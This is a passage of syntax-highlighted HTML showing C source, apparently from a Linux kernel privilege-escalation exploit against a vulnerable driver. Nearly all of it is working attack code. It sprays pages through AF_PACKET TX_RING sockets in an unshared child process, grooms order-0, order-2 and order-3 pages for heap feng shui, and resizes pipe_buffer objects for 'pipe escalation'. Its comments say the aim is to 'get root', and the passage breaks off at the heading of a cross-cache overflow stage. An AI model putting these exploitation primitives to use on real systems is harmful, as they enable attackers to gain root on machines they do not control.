<span class=w>        </span><span class=p>.</span><span class=n>idx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>index</span><span class=p>,</span>
<span class=w>    </span><span class=p>};</span>

<span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>ioctl</span><span class=p>(</span><span class=n>dev_fd</span><span class=p>,</span><span class=w> </span><span class=n>KCACHE_FREE</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>cmd</span><span class=p>);</span>
<span class=p>}</span>

<span class=cm>/**</span>
<span class=cm> * III -  pgv pages sprayer related </span>
<span class=cm> * not that we should create two process:</span>
<span class=cm> * - the parent is the one to send cmd and get root</span>
<span class=cm> * - the child creates an isolate userspace by calling unshare_setup(),</span>
<span class=cm> *      receiving cmd from parent and operates it only</span>
<span class=cm>**/</span>

<span class=cp>#define PGV_PAGE_NUM 1000</span>
<span class=cp>#define PACKET_VERSION 10</span>
<span class=cp>#define PACKET_TX_RING 13</span>

<span class=k>struct</span><span class=w> </span><span class=nc>tpacket_req</span><span class=w> </span><span class=p>{</span>
<span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>tp_block_size</span><span class=p>;</span>
<span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>tp_block_nr</span><span class=p>;</span>
<span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>tp_frame_size</span><span class=p>;</span>
<span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>tp_frame_nr</span><span class=p>;</span>
<span class=p>};</span>

<span class=cm>/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */</span>
<span class=k>struct</span><span class=w> </span><span class=nc>pgv_page_request</span><span class=w> </span><span class=p>{</span>
<span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>idx</span><span class=p>;</span>
<span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>cmd</span><span class=p>;</span>
<span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>size</span><span class=p>;</span>
<span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>nr</span><span class=p>;</span>
<span class=p>};</span>

<span class=cm>/* operations type */</span>
<span class=k>enum</span><span class=w> </span><span class=p>{</span>
<span class=w>    </span><span class=n>CMD_ALLOC_PAGE</span><span class=p>,</span>
<span class=w>    </span><span class=n>CMD_FREE_PAGE</span><span class=p>,</span>
<span class=w>    </span><span class=n>CMD_EXIT</span><span class=p>,</span>
<span class=p>};</span>

<span class=cm>/* tpacket version for setsockopt */</span>
<span class=k>enum</span><span class=w> </span><span class=n>tpacket_versions</span><span class=w> </span><span class=p>{</span>
<span class=w>    </span><span class=n>TPACKET_V1</span><span class=p>,</span>
<span class=w>    </span><span class=n>TPACKET_V2</span><span class=p>,</span>
<span class=w>    </span><span class=n>TPACKET_V3</span><span class=p>,</span>
<span class=p>};</span>

<span class=cm>/* pipe for cmd communication */</span>
<span class=kt>int</span><span class=w> </span><span class=n>cmd_pipe_req</span><span class=p>[</span><span class=mi>2</span><span class=p>],</span><span class=w> </span><span class=n>cmd_pipe_reply</span><span class=p>[</span><span class=mi>2</span><span class=p>];</span>

<span class=cm>/* create a socket and alloc pages, return the socket fd */</span>
<span class=kt>int</span><span class=w> </span><span class=nf>create_socket_and_alloc_pages</span><span class=p>(</span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>nr</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>tpacket_req</span><span class=w> </span><span class=n>req</span><span class=p>;</span>
<span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>socket_fd</span><span class=p>,</span><span class=w> </span><span class=n>version</span><span class=p>;</span>
<span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>ret</span><span class=p>;</span>

<span class=w>    </span><span class=n>socket_fd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>socket</span><span class=p>(</span><span class=n>AF_PACKET</span><span class=p>,</span><span class=w> </span><span class=n>SOCK_RAW</span><span class=p>,</span><span class=w> </span><span class=n>PF_PACKET</span><span class=p>);</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>socket_fd</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>log_error</span><span class=p>(</span><span class=s>&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)&quot;</span><span class=p>);</span>
<span class=w>        </span><span class=n>ret</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>socket_fd</span><span class=p>;</span>
<span class=w>        </span><span class=k>goto</span><span class=w> </span><span class=n>err_out</span><span class=p>;</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=n>version</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>TPACKET_V1</span><span class=p>;</span>
<span class=w>    </span><span class=n>ret</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>setsockopt</span><span class=p>(</span><span class=n>socket_fd</span><span class=p>,</span><span class=w> </span><span class=n>SOL_PACKET</span><span class=p>,</span><span class=w> </span><span class=n>PACKET_VERSION</span><span class=p>,</span><span class=w> </span>
<span class=w>                     </span><span class=o>&amp;</span><span class=n>version</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>version</span><span class=p>));</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>ret</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>log_error</span><span class=p>(</span><span class=s>&quot;[x] failed at setsockopt(PACKET_VERSION)&quot;</span><span class=p>);</span>
<span class=w>        </span><span class=k>goto</span><span class=w> </span><span class=n>err_setsockopt</span><span class=p>;</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=n>memset</span><span class=p>(</span><span class=o>&amp;</span><span class=n>req</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>req</span><span class=p>));</span>
<span class=w>    </span><span class=n>req</span><span class=p>.</span><span class=n>tp_block_size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>size</span><span class=p>;</span>
<span class=w>    </span><span class=n>req</span><span class=p>.</span><span class=n>tp_block_nr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>nr</span><span class=p>;</span>
<span class=w>    </span><span class=n>req</span><span class=p>.</span><span class=n>tp_frame_size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mh>0x1000</span><span class=p>;</span>
<span class=w>    </span><span class=n>req</span><span class=p>.</span><span class=n>tp_frame_nr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>req</span><span class=p>.</span><span class=n>tp_block_size</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>req</span><span class=p>.</span><span class=n>tp_block_nr</span><span class=p>)</span><span class=w> </span><span class=o>/</span><span class=w> </span><span class=n>req</span><span class=p>.</span><span class=n>tp_frame_size</span><span class=p>;</span>

<span class=w>    </span><span class=n>ret</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>setsockopt</span><span class=p>(</span><span class=n>socket_fd</span><span class=p>,</span><span class=w> </span><span class=n>SOL_PACKET</span><span class=p>,</span><span class=w> </span><span class=n>PACKET_TX_RING</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>req</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>req</span><span class=p>));</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>ret</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>log_error</span><span class=p>(</span><span class=s>&quot;[x] failed at setsockopt(PACKET_TX_RING)&quot;</span><span class=p>);</span>
<span class=w>        </span><span class=k>goto</span><span class=w> </span><span class=n>err_setsockopt</span><span class=p>;</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>socket_fd</span><span class=p>;</span>

<span class=nl>err_setsockopt</span><span class=p>:</span>
<span class=w>    </span><span class=n>close</span><span class=p>(</span><span class=n>socket_fd</span><span class=p>);</span>
<span class=nl>err_out</span><span class=p>:</span>
<span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>ret</span><span class=p>;</span>
<span class=p>}</span>

<span class=cm>/* the parent process should call it to send command of allocation to child */</span>
<span class=kt>int</span><span class=w> </span><span class=nf>alloc_page</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>idx</span><span class=p>,</span><span class=w> </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>nr</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>pgv_page_request</span><span class=w> </span><span class=n>req</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=p>.</span><span class=n>idx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>idx</span><span class=p>,</span>
<span class=w>        </span><span class=p>.</span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>CMD_ALLOC_PAGE</span><span class=p>,</span>
<span class=w>        </span><span class=p>.</span><span class=n>size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>size</span><span class=p>,</span>
<span class=w>        </span><span class=p>.</span><span class=n>nr</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>nr</span><span class=p>,</span>
<span class=w>    </span><span class=p>};</span>
<span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>ret</span><span class=p>;</span>

<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>cmd_pipe_req</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>req</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=k>struct</span><span class=w> </span><span class=nc>pgv_page_request</span><span class=p>));</span>
<span class=w>    </span><span class=n>read</span><span class=p>(</span><span class=n>cmd_pipe_reply</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>ret</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>ret</span><span class=p>));</span>

<span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>ret</span><span class=p>;</span>
<span class=p>}</span>

<span class=cm>/* the parent process should call it to send command of freeing to child */</span>
<span class=kt>int</span><span class=w> </span><span class=nf>free_page</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>idx</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>pgv_page_request</span><span class=w> </span><span class=n>req</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=p>.</span><span class=n>idx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>idx</span><span class=p>,</span>
<span class=w>        </span><span class=p>.</span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>CMD_FREE_PAGE</span><span class=p>,</span>
<span class=w>    </span><span class=p>};</span>
<span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>ret</span><span class=p>;</span>

<span class=w>    </span><span class=n>write</span><span class=p>(</span><span class=n>cmd_pipe_req</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>req</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>req</span><span class=p>));</span>
<span class=w>    </span><span class=n>read</span><span class=p>(</span><span class=n>cmd_pipe_reply</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>ret</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>ret</span><span class=p>));</span>

<span class=w>    </span><span class=n>usleep</span><span class=p>(</span><span class=mi>10000</span><span class=p>);</span>

<span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>ret</span><span class=p>;</span>
<span class=p>}</span>

<span class=cm>/* the child, handler for commands from the pipe */</span>
<span class=kt>void</span><span class=w> </span><span class=nf>spray_cmd_handler</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=k>struct</span><span class=w> </span><span class=nc>pgv_page_request</span><span class=w> </span><span class=n>req</span><span class=p>;</span>
<span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>socket_fd</span><span class=p>[</span><span class=n>PGV_PAGE_NUM</span><span class=p>];</span>
<span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>ret</span><span class=p>;</span>

<span class=w>    </span><span class=cm>/* create an isolate namespace*/</span>
<span class=w>    </span><span class=n>unshare_setup</span><span class=p>();</span>

<span class=w>    </span><span class=cm>/* handler request */</span>
<span class=w>    </span><span class=k>do</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>read</span><span class=p>(</span><span class=n>cmd_pipe_req</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>req</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>req</span><span class=p>));</span>

<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>req</span><span class=p>.</span><span class=n>cmd</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>CMD_ALLOC_PAGE</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>ret</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>create_socket_and_alloc_pages</span><span class=p>(</span><span class=n>req</span><span class=p>.</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=n>req</span><span class=p>.</span><span class=n>nr</span><span class=p>);</span>
<span class=w>            </span><span class=n>socket_fd</span><span class=p>[</span><span class=n>req</span><span class=p>.</span><span class=n>idx</span><span class=p>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ret</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>req</span><span class=p>.</span><span class=n>cmd</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=n>CMD_FREE_PAGE</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>ret</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>close</span><span class=p>(</span><span class=n>socket_fd</span><span class=p>[</span><span class=n>req</span><span class=p>.</span><span class=n>idx</span><span class=p>]);</span>
<span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=n>ERROR_MSG</span><span class=p>(</span><span class=s>&quot;[x] invalid request: &quot;</span><span class=p>)</span><span class=w> </span><span class=s>&quot;%d</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=n>req</span><span class=p>.</span><span class=n>cmd</span><span class=p>);</span>
<span class=w>        </span><span class=p>}</span>

<span class=w>        </span><span class=n>write</span><span class=p>(</span><span class=n>cmd_pipe_reply</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=o>&amp;</span><span class=n>ret</span><span class=p>,</span><span class=w> </span><span class=k>sizeof</span><span class=p>(</span><span class=n>ret</span><span class=p>));</span>
<span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>req</span><span class=p>.</span><span class=n>cmd</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=n>CMD_EXIT</span><span class=p>);</span>
<span class=p>}</span>

<span class=cm>/* init pgv-exploit subsystem :) */</span>
<span class=kt>void</span><span class=w> </span><span class=nf>prepare_pgv_system</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=cm>/* pipe for pgv */</span>
<span class=w>    </span><span class=n>pipe</span><span class=p>(</span><span class=n>cmd_pipe_req</span><span class=p>);</span>
<span class=w>    </span><span class=n>pipe</span><span class=p>(</span><span class=n>cmd_pipe_reply</span><span class=p>);</span>

<span class=w>    </span><span class=cm>/* child process for pages spray */</span>
<span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>fork</span><span class=p>())</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=n>spray_cmd_handler</span><span class=p>();</span>
<span class=w>    </span><span class=p>}</span>
<span class=p>}</span>

<span class=cm>/**</span>
<span class=cm> * IV - config for page-level heap spray and heap fengshui</span>
<span class=cm>**/</span>

<span class=cp>#define PIPE_SPRAY_NUM 200</span>

<span class=cp>#define PGV_1PAGE_SPRAY_NUM 0x20</span>

<span class=cp>#define PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM</span>
<span class=cp>#define PGV_4PAGES_SPRAY_NUM 0x40</span>

<span class=cp>#define PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)</span>
<span class=cp>#define PGV_8PAGES_SPRAY_NUM 0x40</span>

<span class=kt>int</span><span class=w> </span><span class=n>pgv_1page_start_idx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=kt>int</span><span class=w> </span><span class=n>pgv_4pages_start_idx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>PGV_4PAGES_START_IDX</span><span class=p>;</span>
<span class=kt>int</span><span class=w> </span><span class=n>pgv_8pages_start_idx</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>PGV_8PAGES_START_IDX</span><span class=p>;</span>

<span class=cm>/* spray pages in different size for various usages */</span>
<span class=kt>void</span><span class=w> </span><span class=nf>prepare_pgv_pages</span><span class=p>(</span><span class=kt>void</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=cm>/**</span>
<span class=cm>     * We want a more clear and continuous memory there, which require us to </span>
<span class=cm>     * make the noise less in allocating order-3 pages.</span>
<span class=cm>     * So we pre-allocate the pages for those noisy objects there.</span>
<span class=cm>     */</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] spray pgv order-0 pages...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>PGV_1PAGE_SPRAY_NUM</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>alloc_page</span><span class=p>(</span><span class=n>i</span><span class=p>,</span><span class=w> </span><span class=mh>0x1000</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;[x] failed to create %d socket for pages spraying!</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=n>i</span><span class=p>);</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] spray pgv order-2 pages...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>PGV_4PAGES_SPRAY_NUM</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>alloc_page</span><span class=p>(</span><span class=n>PGV_4PAGES_START_IDX</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>i</span><span class=p>,</span><span class=w> </span><span class=mh>0x1000</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=mi>4</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;[x] failed to create %d socket for pages spraying!</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=n>i</span><span class=p>);</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=cm>/* spray 8 pages for page-level heap fengshui */</span>
<span class=w>    </span><span class=n>log_info</span><span class=p>(</span><span class=s>&quot;[*] spray pgv order-3 pages...&quot;</span><span class=p>);</span>
<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>PGV_8PAGES_SPRAY_NUM</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=cm>/* a socket need 1 obj: sock_inode_cache, 19 objs for 1 slub on 4 page*/</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>%</span><span class=w> </span><span class=mi>19</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>free_page</span><span class=p>(</span><span class=n>pgv_4pages_start_idx</span><span class=o>++</span><span class=p>);</span>
<span class=w>        </span><span class=p>}</span>

<span class=w>        </span><span class=cm>/* a socket need 1 dentry: dentry, 21 objs for 1 slub on 1 page */</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>%</span><span class=w> </span><span class=mi>21</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>free_page</span><span class=p>(</span><span class=n>pgv_1page_start_idx</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=mi>2</span><span class=p>);</span>
<span class=w>        </span><span class=p>}</span>

<span class=w>        </span><span class=cm>/* a pgv need 1 obj: kmalloc-8, 512 objs for 1 slub on 1 page*/</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>%</span><span class=w> </span><span class=mi>512</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>free_page</span><span class=p>(</span><span class=n>pgv_1page_start_idx</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=mi>2</span><span class=p>);</span>
<span class=w>        </span><span class=p>}</span>

<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>alloc_page</span><span class=p>(</span><span class=n>PGV_8PAGES_START_IDX</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>i</span><span class=p>,</span><span class=w> </span><span class=mh>0x1000</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=mi>8</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;[x] failed to create %d socket for pages spraying!</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=n>i</span><span class=p>);</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=n>puts</span><span class=p>(</span><span class=s>&quot;&quot;</span><span class=p>);</span>
<span class=p>}</span>

<span class=cm>/* for pipe escalation */</span>
<span class=cp>#define SND_PIPE_BUF_SZ 96</span>
<span class=cp>#define TRD_PIPE_BUF_SZ 192</span>

<span class=kt>int</span><span class=w> </span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>PIPE_SPRAY_NUM</span><span class=p>][</span><span class=mi>2</span><span class=p>];</span>
<span class=kt>int</span><span class=w> </span><span class=n>orig_pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>-1</span><span class=p>,</span><span class=w> </span><span class=n>victim_pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>-1</span><span class=p>;</span>
<span class=kt>int</span><span class=w> </span><span class=n>snd_orig_pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>-1</span><span class=p>,</span><span class=w> </span><span class=n>snd_vicitm_pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>-1</span><span class=p>;</span>
<span class=kt>int</span><span class=w> </span><span class=n>self_2nd_pipe_pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>-1</span><span class=p>,</span><span class=w> </span><span class=n>self_3rd_pipe_pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>-1</span><span class=p>,</span><span class=w> </span><span class=n>self_4th_pipe_pid</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>-1</span><span class=p>;</span>

<span class=k>struct</span><span class=w> </span><span class=nc>pipe_buffer</span><span class=w> </span><span class=n>info_pipe_buf</span><span class=p>;</span>

<span class=kt>int</span><span class=w> </span><span class=nf>extend_pipe_buffer_to_4k</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>start_idx</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=w> </span><span class=n>nr</span><span class=p>)</span>
<span class=p>{</span>
<span class=w>    </span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>0</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>nr</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>        </span><span class=cm>/* let the pipe_buffer to be allocated on order-3 pages (kmalloc-4k) */</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>i</span><span class=w> </span><span class=o>%</span><span class=w> </span><span class=mi>8</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>free_page</span><span class=p>(</span><span class=n>pgv_8pages_start_idx</span><span class=o>++</span><span class=p>);</span>
<span class=w>        </span><span class=p>}</span>

<span class=w>        </span><span class=cm>/* a pipe_buffer on 1k is for 16 pages, so 4k for 64 pages */</span>
<span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>fcntl</span><span class=p>(</span><span class=n>pipe_fd</span><span class=p>[</span><span class=n>start_idx</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>i</span><span class=p>][</span><span class=mi>1</span><span class=p>],</span><span class=w> </span><span class=n>F_SETPIPE_SZ</span><span class=p>,</span><span class=w> </span><span class=mh>0x1000</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=mi>64</span><span class=p>)</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span>
<span class=w>            </span><span class=n>printf</span><span class=p>(</span><span class=s>&quot;[x] failed to extend %d pipe!</span><span class=se>\n</span><span class=s>&quot;</span><span class=p>,</span><span class=w> </span><span class=n>start_idx</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>i</span><span class=p>);</span>
<span class=w>            </span><span class=k>return</span><span class=w> </span><span class=mi>-1</span><span class=p>;</span>
<span class=w>        </span><span class=p>}</span>
<span class=w>    </span><span class=p>}</span>

<span class=w>    </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=p>;</span>
<span class=p>}</span>

<span class=cm>/**</span>
<span class=cm> *  V - FIRST exploit stage - cross-cache overflow to make page-level UAF</span>
